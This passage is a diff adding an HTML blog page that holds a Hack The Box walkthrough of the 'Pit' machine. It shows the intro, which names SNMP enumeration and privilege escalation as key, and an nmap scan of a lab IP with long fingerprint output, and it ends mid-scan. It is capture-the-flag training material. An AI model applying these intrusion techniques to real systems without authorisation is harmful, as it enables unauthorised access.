@@ -1,0 +1,1415 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <!-- start custom head snippets -->
+<!-- Begin Jekyll GTM tag v1.0.3 -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
+<!-- End Jekyll GTM tag v1.0.3 -->
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/09/htb-pit">
+<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/09/htb-pit">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/09/htb-pit">
+        
+<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/09/htb-pit">
+        
+    
+
+
+<!-- end custom head snippets -->
+
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Walktrough: HTB Pit | Davi Cruz</title>
+<meta name="description" content="Hello guys!  This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Walktrough: HTB Pit">
+<meta property="og:url" content="https://davicruz.com/walkthrough/2021/09/htb-pit">
+
+
+  <meta property="og:description" content="Hello guys!  This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/pUqq7fY.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Walktrough: HTB Pit">
+  <meta name="twitter:description" content="Hello guys!  This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.">
+  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/09/htb-pit">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.imgur.com/pUqq7fY.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-09-25T09:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/walkthrough/2021/09/htb-pit">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+  </head>
+
+  <body class="layout--single wide">
+    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Jekyll GTM tag v1.0.3 (noscript) -->
+
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <!-- CUSTOM: Edit to adjust links to localized page -->
+        
+        
+          <a class="site-logo" href="/en-US"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+        
+        <a class="site-title" href="/en-US">
+          Davi Cruz
+          
+        </a>
+        
+        <!-- END CUSTOM: Edit to adjust links to localized page -->
+        <ul class="visible-links">
+          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
+              <a href="/en-US/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/tag/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/about/">About</a>
+            </li>
+<!-- END CUSTOM: Edit to get localized navigation -->
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://davicruz.com/">
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Walktrough: HTB Pit">
+    <meta itemprop="description" content="Hello guys!This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.">
+    <meta itemprop="datePublished" content="2021-09-25T09:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://davicruz.com/walkthrough/2021/09/htb-pit" class="u-url" itemprop="url">Walktrough: HTB Pit
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          12 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/09/htb-pit">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>Hello guys!</p>
+
+<p>This week’s machine will be <strong>Pit</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> and <a href="https://app.hackthebox.eu/users/125033">GibParadox</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>
+
+<p><img src="https://i.imgur.com/pFwxqgv.png" alt="HTB Pit" class="align-center"></p>
+
+<p>This box was pretty different from the others as required some UDP enumeration, not often necessary but always useful when you’re at a dead-end <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20">. SNMP was key to enumerating and privesc this box, which had greater complexity once had SELinux enabled and didn’t allow an interactive shell until we get valid credentials to the system, connect via SSH and escalate privileges.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>As usual, started by running a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan to see which services are currently published</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.241
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.                                 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 12:15 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.241
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http            nginx 1.14.1
+|_http-server-header: nginx/1.14.1
+|_http-title: Test Page <span class="k">for </span>the Nginx HTTP Server on Red Hat Enterprise Linux
+9090/tcp open  ssl/zeus-admin?
+| fingerprint-strings:
+|   GetRequest, HTTPOptions:
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf8
+|     Transfer-Encoding: chunked
+|     X-DNS-Prefetch-Control: off
+|     Referrer-Policy: no-referrer
+|     X-Content-Type-Options: nosniff
+|     Cross-Origin-Resource-Policy: same-origin
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;title&gt;
+|     request
+|     &lt;/title&gt;
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
+|     &lt;style&gt;
+|     body <span class="o">{</span>
+|     margin: 0<span class="p">;</span>
+|     font-family: <span class="s2">"RedHatDisplay"</span>, <span class="s2">"Open Sans"</span>, Helvetica, Arial, sans-serif<span class="p">;</span>
+|     font-size: 12px<span class="p">;</span>
+|     line-height: 1.66666667<span class="p">;</span>
+|     color: <span class="c">#333333;</span>
+|     background-color: <span class="c">#f5f5f5;</span>
+|     border: 0<span class="p">;</span>
+|     vertical-align: middle<span class="p">;</span>
+|     font-weight: 300<span class="p">;</span>
+|_    margin: 0 0 10p
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
+| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+| Not valid before: 2020-04-16T23:29:12
+|_Not valid after:  2030-06-04T16:09:12
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9090-TCP:V<span class="o">=</span>7.91%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>8/10%Time<span class="o">=</span>61129849%P<span class="o">=</span>x86_64-pc-linux-gn
+SF:u%r<span class="o">(</span>GetRequest,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">Content-Type:
+SF:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encoding:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DN
+SF:S-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Cont
+SF:ent-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Resource-Policy:</span><span class="se">\x</span><span class="s2">20same-o
+SF:rigin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;met
+SF:a</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">text/html;</span><span class="se">\x</span><span class="s2">20charset=utf
+SF:-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=de
+SF:vice-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;style&gt;</span><span class="se">\n\t</span><span class="s2">body</span><span class="se">\x</span><span class="s2">
+SF:20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20margin:</span><span class="se">\x</span><span class="s2">200;</span><span class="se">\n\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-family:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">RedHatDi
+SF:splay</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Open</span><span class="se">\x</span><span class="s2">20Sans</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20Helvetica,</span><span class="se">\x</span><span class="s2">20Arial,</span><span class="se">\x</span><span class="s2">20sans-serif;</span><span class="se">\n\</span><span class="s2">
+SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-size:</span><span class="se">\x</span><span class="s2">2012px;</span><span class="se">\n\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20line-height:</span><span class="se">\x</span><span class="s2">201</span><span class="se">\.</span><span class="s2">6666666
+SF:7;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20color:</span><span class="se">\x</span><span class="s2">20#333333;</span><span class="se">\</span><span class="s2">
+SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20background-color:</span><span class="se">\x</span><span class="s2">20#
+SF:f5f5f5;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20img</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20border:</span><span class="se">\</span><span class="s2">
+SF:x200;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20vertical-align:</span><span class="se">\</span><span class="s2">
+SF:x20middle;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20h1</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-w
+SF:eight:</span><span class="se">\x</span><span class="s2">20300;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20p</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20mar
+SF:gin:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">2010p"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20r
+SF:equest</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encod
+SF:ing:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DNS-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">
+SF:20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Res
+SF:ource-Policy:</span><span class="se">\x</span><span class="s2">20same-origin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;
+SF:head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title
+SF:&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">te
+SF:xt/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\</span><span class="s2">
+SF:"</span><span class="se">\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span>1<span class="se">\.</span>0<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>
+SF:20<span class="se">\x</span>20&lt;style&gt;<span class="se">\n\t</span>body<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
